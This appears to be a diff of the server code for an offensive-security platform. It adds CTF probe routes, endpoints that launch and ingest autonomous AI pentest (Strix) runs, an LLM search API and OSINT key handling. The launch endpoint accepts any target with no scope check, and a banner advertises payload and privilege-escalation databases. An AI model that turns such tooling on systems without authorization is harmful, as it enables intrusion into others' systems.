+      if (body.headers && typeof body.headers === 'object') Object.assign(headers, body.headers as Record<string, string>);
+      init.headers = headers;
+      let fetchRes: globalThis.Response;
+      const prevTlsReject = process.env.NODE_TLS_REJECT_UNAUTHORIZED;
+      if (url.protocol === 'https:' && loopback) {
+        process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
+      }
+      try {
+        fetchRes = await fetch(url, init);
+      } catch (fetchErr) {
+        if (url.protocol === 'https:' && loopback) {
+          process.env.NODE_TLS_REJECT_UNAUTHORIZED = prevTlsReject;
+        }
+        const msg = String((fetchErr as Error).message || fetchErr);
+        const isAbort = /abort|timeout|timed out/i.test(msg);
+        const status = isAbort ? 504 : 502;
+        console.warn(`[ctf probe] fetch failed external=${external} ${method} ${url} after ${Date.now() - probeStartedAt}ms: ${msg}`);
+        res.status(status).json({ ok: false, error: isAbort ? `probe timed out after 25s — target slow or blocked (WAF)` : msg, kind: 'http' });
+        return;
+      }
+      if (url.protocol === 'https:' && loopback) {
+        process.env.NODE_TLS_REJECT_UNAUTHORIZED = prevTlsReject;
+      }
+      const text = (await fetchRes.text()).slice(0, 16384);
+      console.log(`[ctf probe] ${external ? 'external' : 'range'} ${method} ${url} → ${fetchRes.status} ${text.length}b in ${Date.now() - probeStartedAt}ms`);
+      res.json({ ok: true, kind: 'http', status: fetchRes.status, contentType: fetchRes.headers.get('content-type') || '', body: text });
+      return;
+    }
+
+    if (body.kind === 'tcp') {
+      const port = parseInt(body.port, 10);
+      if (!allowed.has(port)) {
+        res.status(403).json({ error: `port must be a running range port (allowed: ${[...allowed].sort((a, b) => a - b).join(', ')})` });
+        return;
+      }
+      const out = await ctfTcpRoundtrip(port, String(body.data ?? ''));
+      res.json({ ok: true, kind: 'tcp', body: out });
+      return;
+    }
+
+    res.status(400).json({ error: 'kind must be http|tcp' });
+  } catch (e) {
+    res.status(500).json({ error: String((e as Error).message || e) });
+  }
+});
+
+// =============================================================================
 // STATIC FILE SERVING
 // =============================================================================
 
@@ -8147,7 +13162,393 @@ app.get('/api/agents/local/status', async (req: Request, res: Response): Promise
 // matches the exact '/' path and never shadows the /api/* routes above.
 app.get('/', (_req: Request, res: Response) => res.redirect('/ui/'));
 
-app.use('/ui', express.static('docs'));
+app.use('/ui', express.static('docs', {
+  index: 'shell.html',
+  setHeaders: (res, path) => {
+    // Operator pages iterate fast — never let a browser serve stale HTML/JS from cache.
+    if (path.endsWith('.html') || path.endsWith('.js')) res.setHeader('Cache-Control', 'no-cache');
+  },
+}));
+
+// Stale-bookmark convenience: every operator page lives under /ui/ (the shell mount), so a
+// root-level /ctf.html-style request 404s today. 301 the known pages to their shell location.
+const DOC_PAGES = new Set([
+  'about.html', 'arsenal.html', 'configs.html', 'ctf.html', 'cves.html', 'dfir.html',
+  'evidence.html', 'general.html', 'index.html', 'live-scan.html', 'obsidivm.html',
+  'operators.html', 'osint.html', 'gps.html', 'receipts.html', 'self-improve.html', 'settings.html', 'strix.html', 'terminal.html', 'shell.html',
+]);
+app.get('/:page', (req: Request, res: Response, next: NextFunction) => {
+  const page = String(req.params.page || '');
+  if (DOC_PAGES.has(page)) return res.redirect(301, `/ui/${page}`);
+  next();
+});
+
+// =============================================================================
+// STRIX — autonomous AI pentest runs (K:\coding\appDev\strix)
+// Reads strix_runs/ from disk (cwd or STRIX_RUNS_DIR) without spawning Python.
+// Viewer SPA is intentionally NOT re-served here — use `strix view` / app.strix.ai;
+// these endpoints surface the run inventory + artifacts as T3MP3ST JSON so the
+// Strix leaf page can render the cross-run history and ingest vulns to the vault.
+// =============================================================================
+import * as pathFs from 'path';
+import { readdirSync, existsSync as _existsSync, statSync as _statSync } from 'fs';
+function strixBaseDirs(): string[] {
+  const env = process.env.STRIX_RUNS_DIR ? [process.env.STRIX_RUNS_DIR] : [];
+  const cwd = pathFs.join(process.cwd(), 'strix_runs');
+  const sibling = pathFs.resolve('K:/coding/appDev/strix/strix_runs');
+  const t3mp = pathFs.resolve('K:/coding/T3MP3ST/strix_runs');
+  // Dedicated, then preferred sibling (dev checkout), then cwd-relative.
+  const raw = [...env, sibling, cwd, t3mp];
+  const seen = new Set<string>();
+  const out: string[] = [];
+  for (const p of raw) { const k = pathFs.resolve(p).toLowerCase(); if (!seen.has(k)) { seen.add(k); out.push(p); } }
+  return out;
+}
+function strixFirstBase(): string | null {
+  for (const d of strixBaseDirs()) try { if (_existsSync(d)) return d; } catch { /* unreadable candidate — try the next */ }
+  // no dir exists yet — advertise the preferred base so the UI can show it
+  return strixBaseDirs()[0] ?? null;
+}
+function strixIterRunDirs(base: string): string[] {
+  try {
+    const entries = readdirSync(base, { withFileTypes: true });
+    const dirs = entries.filter(e => e.isDirectory()).map(e => pathFs.join(base, e.name))
+      .filter(d => _existsSync(pathFs.join(d, 'run.json')));
+    dirs.sort((a, b) => {
+      try {
+        const at = _existsSync(pathFs.join(a, 'run.json')) ? _statSync(pathFs.join(a, 'run.json')).mtimeMs : 0;
+        const bt = _existsSync(pathFs.join(b, 'run.json')) ? _statSync(pathFs.join(b, 'run.json')).mtimeMs : 0;
+        return bt - at;
+      } catch { return 0; }
+    });
+    return dirs;
+  } catch { return []; }
+}
+function strixReadJson<T>(p: string, fallback: T): T {
+  try { const raw = readFileSync(p, 'utf-8'); const j = JSON.parse(raw); return j as T; } catch { return fallback; }
+}
+function strixSeverityCounts(vulns: any[]): Record<string, number> {
+  const c: Record<string, number> = { critical: 0, high: 0, medium: 0, low: 0 };
+  for (const v of vulns) {
+    const s = String((v && v.severity) || '').toLowerCase().trim();
+    const k = (c as any)[s] !== undefined ? s : 'low';
+    (c as any)[k] = ((c as any)[k] || 0) + 1;
+  }
+  return c;
+}
+function strixPrimaryTarget(rec: any): string | null {
+  const infos = rec && rec.targets_info;
+  if (Array.isArray(infos)) for (const e of infos) if (e && typeof e.original === 'string' && e.original) return e.original;
+  if (typeof rec?.target === 'string' && rec.target) return rec.target;
+  return null;
+}
+function strixRunEntry(dir: string): any {
+  const rec = strixReadJson<any>(pathFs.join(dir, 'run.json'), {});
+  const vulns: any[] = (() => { try { const j = strixReadJson<any>(pathFs.join(dir, 'vulnerabilities.json'), []); return Array.isArray(j) ? j : []; } catch { return []; } })();
+  const finished = ['completed', 'stopped', 'failed', 'interrupted'].includes(String(rec.status || '')) && !!rec.end_time;
+  return {
+    name: rec.run_name || pathFs.basename(dir),
+    dir,
+    target: strixPrimaryTarget(rec),
+    scan_mode: rec.scan_mode || null,
+    status: rec.status || null,
+    start_time: rec.start_time || null,
+    end_time: rec.end_time || null,
+    finished,
+    severity_counts: strixSeverityCounts(vulns),
+    vuln_count: vulns.length,
+  };
+}
+function strixCollectRuns(): { baseDir: string | null, source: string, runs: any[] } {
+  const preferred = strixBaseDirs();
+  for (const base of preferred) {
+    const runs = strixIterRunDirs(base);
+    if (runs.length) return { baseDir: base, source: base === preferred[0] ? 'env' : (base.includes('appDev') ? 'strix-checkout' : 'cwd'), runs: runs.map(strixRunEntry) };
+  }
+  // nothing found anywhere — expose first base that exists or would be created
+  const fb = strixFirstBase();
+  return { baseDir: fb, source: fb ? 'empty' : 'none', runs: [] };
+}
+app.get('/api/strix/status', (_req: Request, res: Response) => {
+  try {
+    const { baseDir, source, runs } = strixCollectRuns();
+    const viewerBuilt = (() => {
+      try {
+        const p = pathFs.resolve('K:/coding/appDev/strix/strix/interface/viewer/static/index.html');
+        return _existsSync(p);
+      } catch { return false; }
+    })();
+    const totalVulns = runs.reduce((n: number, r: any) => n + (r.vuln_count || 0), 0);
+    const liveCount = runs.filter((r: any) => !r.finished).length;
+    const finishedCount = runs.length - liveCount;
+    res.json({
+      ok: true,
+      baseDir, source, runs, count: runs.length,
+      totalVulns, liveCount, finishedCount,
+      viewerBuilt, viewerUrl: null,
+    });
+  } catch (e: any) {
+    res.status(500).json({ ok: false, error: e?.message || String(e) });
+  }
+});
+app.get('/api/strix/runs', (_req: Request, res: Response) => {
+  try {
+    const { baseDir, source, runs } = strixCollectRuns();
+    res.json({ count: runs.length, baseDir, source, runs });
+  } catch (e: any) { res.status(500).json({ error: e?.message || String(e) }); }
+});
+app.get('/api/strix/run', (req: Request, res: Response) => {
+  try {
+    const name = String(req.query.run || '').trim();
+    if (!name) { res.status(400).json({ error: 'run query param required' }); return; }
+    const { baseDir } = strixCollectRuns();
+    if (!baseDir) { res.status(404).json({ error: 'no strix_runs base found' }); return; }
+    const dir = pathFs.join(baseDir, name);
+    const resolved = pathFs.resolve(dir);
+    const baseRes = pathFs.resolve(baseDir);
+    if (resolved === baseRes || !resolved.startsWith(baseRes + pathFs.sep) || !_existsSync(pathFs.join(resolved, 'run.json'))) {
+      res.status(404).json({ error: 'unknown run' }); return;
+    }
+    const rec = strixReadJson<any>(pathFs.join(resolved, 'run.json'), {});
+    const vulns: any[] = (() => { try { const j = strixReadJson<any>(pathFs.join(resolved, 'vulnerabilities.json'), []); return Array.isArray(j) ? j : []; } catch { return []; } })();
+    let markdown = '';
+    try { const p = pathFs.join(resolved, 'penetration_test_report.md'); if (_existsSync(p)) markdown = readFileSync(p, 'utf-8'); } catch { /* no readable report — markdown stays empty and is sent as null */ }
+    res.json({ name, dir: resolved, record: rec, vulnerabilities: vulns, markdown: markdown || null });
+  } catch (e: any) { res.status(500).json({ error: e?.message || String(e) }); }
+});
+app.get('/api/strix/viewer', (req: Request, res: Response) => {
+  // T3MP3ST does not re-host Strix's token-gated viewer. Use `strix view` locally
+  // or the cloud viewer. This endpoint reports how to open it and, when a loopback
+  // viewer is actually reachable, proxies its authorized URL if the caller supplies
+  // ?token= or the server can discover it (best-effort).
+  const run = String(req.query.run || '').trim();
+  res.json({
+    ok: false,
+    message: 'Run `strix view' + (run ? ' --run ' + JSON.stringify(run) : '') + '` in your terminal (or `strix view --help`) to open the Strix viewer. Paste its http://127.0.0.1:PORT/?token=... URL into the Strix page viewer input to embed it.',
+    hint: 'The viewer SPA is a Python stdlib server (strix/interface/viewer/server.py) with a per-process session token — it must be started from Python, not this Node API.',
+    url: null,
+  });
+});
+app.post('/api/strix/launch', async (req: Request, res: Response) => {
+  try {
+    const body = (req.body || {}) as any;
+    const target = String(body.target || '').trim();
+    if (!target) { res.status(400).json({ error: 'target is required (path, URL, GitHub, or OpenAPI spec)' }); return; }
+    const scan_mode = typeof body.scan_mode === 'string' ? body.scan_mode.trim() || undefined : undefined;
+    const llm = typeof body.llm === 'string' ? body.llm.trim() || undefined : undefined;
+    const instruction = typeof body.instruction === 'string' ? body.instruction.trim() || undefined : undefined;
+    const non_interactive = body.non_interactive !== false;
+    // Build a non-interactive command the operator can also run directly
+    const args: string[] = [];
+    if (non_interactive) args.push('-n');
+    args.push('--target', target);
+    if (scan_mode) args.push('--scan-mode', scan_mode);
+    if (llm) args.push('--model', llm);
+    if (instruction) args.push('--instruction', instruction);
+    const displayCmd = ['strix', ...args.map(a => (a.includes(' ') ? JSON.stringify(a) : a))].join(' ');
+    // Best-effort detached spawn so the Node server does not hold the child
+    let spawnOk = false, spawnError: string | null = null;
+    try {
+      const child = spawn('strix', args, {
+        detached: true, stdio: 'ignore',
+        env: { ...process.env, ...(llm ? { STRIX_LLM: llm } as any : {}) },
+        windowsHide: true,
+      } as any);
+      child.unref();
+      spawnOk = true;
+    } catch (e: any) { spawnError = e?.message || String(e); }
+    if (spawnOk) {
+      res.json({ ok: true, message: 'Strix launch requested — check your terminal / strix_runs for progress.', cmd: displayCmd });
+    } else {
+      res.json({
+        ok: true,
+        message: 'Launch command prepared — run it in a terminal with strix installed.',
+        cmd: displayCmd,
+        note: spawnError ? `Detached spawn failed (${spawnError}); run the command manually.` : undefined,
+      });
+    }
+  } catch (e: any) { res.status(500).json({ error: e?.message || String(e) }); }
+});
+app.post('/api/strix/ingest', async (req: Request, res: Response) => {
+  try {
+    const name = String(((req.body as any)?.run) || (req.query as any)?.run || '').trim();
+    if (!name) { res.status(400).json({ error: 'run is required' }); return; }
+    const { baseDir } = strixCollectRuns();
+    if (!baseDir) { res.status(404).json({ error: 'no strix_runs base found' }); return; }
+    const dir = pathFs.join(baseDir, name);
+    const resolved = pathFs.resolve(dir);
+    const baseRes = pathFs.resolve(baseDir);
+    if (resolved === baseRes || !resolved.startsWith(baseRes + pathFs.sep) || !_existsSync(pathFs.join(resolved, 'run.json'))) {
+      res.status(404).json({ error: 'unknown run' }); return;
+    }
+    let vulns: any[] = [];
+    try { const j = strixReadJson<any>(pathFs.join(resolved, 'vulnerabilities.json'), []); vulns = Array.isArray(j) ? j : []; } catch { /* unreadable or absent — vulns stays empty */ }
+    if (!vulns.length) { res.json({ ok: true, ingested: 0, message: 'No vulnerabilities in this run yet.' }); return; }
+    // Map Strix vulns → T3MP3ST findings (best-effort; keep the shape loose so future
+    // Strix fields do not break ingestion). Persist via the same path live-scan uses.
+    let ingested = 0;
+    for (const v of vulns) {
+      if (!v || typeof v !== 'object') continue;
+      try {
+        const title = String(v.title || v.name || v.id || 'Strix finding');
+        const severity = String(v.severity || 'medium').toLowerCase();
+        const sev: any = ['critical','high','medium','low','info','informational'].includes(severity) ? severity : 'medium';
+        upsertMissionFindingToLedger({
+            title, severity: sev,
+            description: String(v.description || v.summary || ''),
+            evidence: v.proof || v.evidence || v.url || '',
+            source: 'strix:' + name,
+            raw: v,
+          } as any);
+        ingested++;
+      } catch { /* one bad record must not abort the batch */ }
+    }
+    res.json({ ok: true, ingested, total: vulns.length });
+  } catch (e: any) { res.status(500).json({ error: e?.message || String(e) }); }
+});
+
+// =============================================================================
+// Cairn search — state-space search over a blackboard fact-intent graph.
+//
+// Techniques reimplemented from oritera/Cairn (AGPL-3.0); no upstream code is
+// vendored. A search runs DETACHED: start returns an id immediately, status
+// polls the live graph as it grows, and a hint injected mid-search is a new
+// situation — the reasoner absorbs it on its next round (the Hint primitive).
+// =============================================================================
+
+interface CairnRunState {
+  id: string;
+  board: CairnBoard;
+  startedAt: number;
+  result: CairnSearchResult | null;
+  error: string | null;
+}
+const cairnRuns = new Map<string, CairnRunState>();
+
+function cairnRunView(st: CairnRunState) {
+  const b = st.board;
+  return {
+    id: st.id,
+    state: st.error ? 'failed' : (st.result ? st.result.state : 'running'),
+    origin: b.origin,
+    goal: b.goal,
+    startedAt: st.startedAt,
+    ms: Date.now() - st.startedAt,
+    completion: b.completion,
+    facts: [...b.facts.values()],
+    intents: [...b.intents.values()],
+    hints: b.hints.map((h) => h.text),
+    journal: st.result?.journal ?? [],
+    error: st.error,
+  };
+}
+
+app.post('/api/search/start', async (req: Request, res: Response): Promise<void> => {
+  const origin = String(req.body?.origin ?? '').trim();
+  const goal = String(req.body?.goal ?? '').trim();
+  if (!origin || !goal) {
+    res.status(400).json({ error: 'origin and goal are required — the search needs both to have a path' });
+    return;
+  }
+  const hints = Array.isArray(req.body?.hints) ? req.body.hints.map((h: unknown) => String(h)).filter((h: string) => h.trim()) : [];
+  const clamp = (v: unknown, lo: number, hi: number, dflt: number) => {
+    const n = Number(v);
+    return Number.isFinite(n) ? Math.min(hi, Math.max(lo, n)) : dflt;
+  };
+  try {
+    // resolveGeneralLLMConfig THROWS on a missing key — same contract as the
+    // mission route: refuse before any mutation, message straight to 400.
+    const cfg = resolveGeneralLLMConfig(req.body?.provider, req.body?.model, req.body?.apiKey, req.body?.baseUrl);
+    const backbone = new LLMBackbone(cfg);
+    const chat = (system: string, user: string) => backbone.prompt(user, system);
+    const id = `cairn_${Date.now().toString(36)}`;
+    const startedAt = Date.now();
+    const searchConfig = {
+      budgetMs: clamp(req.body?.budgetMs, 20_000, 30 * 60_000, 6 * 60_000),
+      taskTimeoutMs: clamp(req.body?.taskTimeoutMs, 10_000, 10 * 60_000, 120_000),
+      maxIntents: clamp(req.body?.maxIntents, 1, 8, 4),
+      maxProjectWorkers: clamp(req.body?.maxProjectWorkers, 1, 6, 3),
+      bootstrapEnabled: req.body?.bootstrapEnabled !== false,
+    };
+    const state: CairnRunState = {
+      id,
+      // The board is built by the engine; onBoardReady hands it back so status
+      // can render the graph LIVE and hints can land mid-search.
+      board: null as unknown as CairnBoard,
+      startedAt,
+      result: null,
+      error: null,
+    };
+    cairnRuns.set(id, state);
+    while (cairnRuns.size > 20) {
+      const oldest = cairnRuns.keys().next().value as string | undefined;
+      if (!oldest) break;
+      cairnRuns.delete(oldest);
+    }
+    console.log(`[T3MP3ST][CAIRN] search ${id} started: ${origin} → ${goal} (budget ${(searchConfig.budgetMs / 1000) | 0}s)`);
+    void runCairnSearch({
+      origin,
+      goal,
+      hints,
+      chat,
+      searchId: id,
+      config: searchConfig,
+      onBoardReady: (board) => { state.board = board; },
+    }).then((result) => {
+      state.result = result;
+      console.log(`[T3MP3ST][CAIRN] search ${id} → ${result.state} in ${(result.ms / 1000).toFixed(1)}s (${result.facts.length} facts, ${result.intents.length} intents)`);
+    }).catch((e: unknown) => {
+      state.error = e instanceof Error ? e.message : String(e);
+      console.warn(`[T3MP3ST][CAIRN] search ${id} failed: ${state.error}`);
+    });
+    res.json({ ok: true, searchId: id, note: 'search running — poll /api/search/status?id=… and inject hints with /api/search/hint' });
+  } catch (error: any) {
+    res.status(400).json({ error: error?.message || 'search could not start' });
+  }
+});
+
+app.get('/api/search/status', (req: Request, res: Response): void => {
+  const id = String(req.query.id ?? '');
+  const st = (id && cairnRuns.get(id)) || [...cairnRuns.values()].pop();
+  if (!st) {
+    res.status(404).json({ error: 'no such search — start one with POST /api/search/start' });
+    return;
+  }
+  res.json(cairnRunView(st));
+});
+
+app.get('/api/search/list', (_req: Request, res: Response): void => {
+  res.json({
+    searches: [...cairnRuns.values()].map((st) => ({
+      id: st.id,
+      state: st.error ? 'failed' : (st.result ? st.result.state : 'running'),
+      origin: st.board?.origin ?? '',
+      goal: st.board?.goal ?? '',
+      startedAt: st.startedAt,
+    })),
+  });
+});
+
+app.post('/api/search/hint', (req: Request, res: Response): void => {
+  const id = String(req.body?.id ?? '');
+  const text = String(req.body?.text ?? '').trim();
+  const st = (id && cairnRuns.get(id)) || [...cairnRuns.values()].pop();
+  if (!st || !st.board) {
+    res.status(404).json({ error: 'no such running search' });
+    return;
+  }
+  if (!text) {
+    res.status(400).json({ error: 'text required' });
+    return;
+  }
+  if (st.board.completion) {
+    res.status(409).json({ error: 'search already complete — hints apply to live searches' });
+    return;
+  }
+  st.board.addHint(text);
+  console.log(`[T3MP3ST][CAIRN] hint injected into ${st.id}: ${text.slice(0, 80)}`);
+  res.json({ ok: true, hints: st.board.hints.map((h) => h.text), note: 'the reasoner absorbs this on its next round — a new hint is a new situation' });
+});
 
 // =============================================================================
 // ERROR HANDLING
@@ -8180,6 +13581,23 @@ async function startServer() {
   console.log('');
 
   await loadPersistedState();
+  loadDbSettings();
+  // Restore runtime dump-lane keys persisted in the settings DB (values never leave the box).
+  for (const [k, v] of Object.entries(dbSettings)) {
+    if (k.startsWith('osintDumpKeys.') && typeof v === 'string' && v.trim()) {
+      const svc = k.slice('osintDumpKeys.'.length);
+      if (isDumpKeyService(svc)) setDumpKey(svc, v);
+    }
+  }
+  if (typeof dbSettings['osint.opencellidKey'] === 'string' && dbSettings['osint.opencellidKey'].trim()) {
+    setOpencellidKey(dbSettings['osint.opencellidKey']);
+  }
+  if (typeof dbSettings['osint.allowDirect'] === 'boolean') {
+    process.env.T3MP3ST_OSINT_ALLOW_DIRECT = dbSettings['osint.allowDirect'] ? '1' : '0';
+  }
+  // Re-apply the operator's local-agent selection so a restart doesn't silently empty it.
+  try { restoreLocalAgentSelection(); } catch (e) { console.warn(`[T3MP3ST] local-agent selection restore failed: ${(e as Error).message}`); }
+  try { reindexCredentialsFromLedgers(); } catch { /* ignore on boot */ }
 
   // Install the outbound SOCKS5 proxy (if TEMPEST_PROXY_URL / saved settings define one)
   // BEFORE anything makes outbound calls, so all test/attack fetch() egress is covered.
@@ -8214,9 +13632,18 @@ async function startServer() {
   process.once('SIGTERM', flushAndExit);
   process.once('SIGINT', flushAndExit);
 
-  app.listen(Number(PORT), HOST, () => {
+  const server = app.listen(Number(PORT), HOST, () => {
     console.log(`[T3MP3ST] Server running at http://${HOST}:${PORT}`);
     console.log(`[T3MP3ST] Web UI available at http://${HOST}:${PORT}/ui`);
+    // Fire-and-forget: real env-injected keys land in the gitignored .env on boot.
+    void persistEnvKeysToEnvFile();
+    // Fire-and-forget: pre-warm the binary-location cache so the first /api/arsenal/status
+    // (and every tool call) hits a warm cache instead of paying the ~6s cold where.exe sweep.
+    void import('./arsenal/index.js').then(({ findBinaryLocations }) =>
+      findBinaryLocations([...new Set(TOOL_ADAPTERS.map(a => a.binary))])
+        .then((m) => console.log(`[T3MP3ST] Binary cache pre-warmed (${m.size} binaries)`))
+        .catch(() => { /* cache stays cold; endpoints degrade to the probe path */ }),
+    );
     if (!HOST_IS_LOOPBACK) {
       console.warn('');
       console.warn(`  ⚠️  EXPOSURE WARNING: bound to NON-LOOPBACK host "${HOST}". This API executes`);
@@ -8271,6 +13698,18 @@ async function startServer() {
     console.log('[T3MP3ST] Payload DB: 200+ payloads | Secret Patterns: 15+ | Privesc: 50+ techniques');
     console.log('');
   });
+
+  server.on('error', (err: NodeJS.ErrnoException) => {
+    if (err.code === 'EADDRINUSE') {
+      console.error(`[T3MP3ST] Port ${PORT} already in use — is another instance running? Shutting down so Docker can restart.`);
+    } else {
+      console.error('[T3MP3ST] Failed to bind server:', err);
+    }
+    process.exit(1);
+  });
 }
 
-startServer().catch(console.error);
+startServer().catch((err) => {
+  console.error('[T3MP3ST] Fatal startup error:', err instanceof Error ? err.stack || err.message : err);
+  process.exit(1);
+});
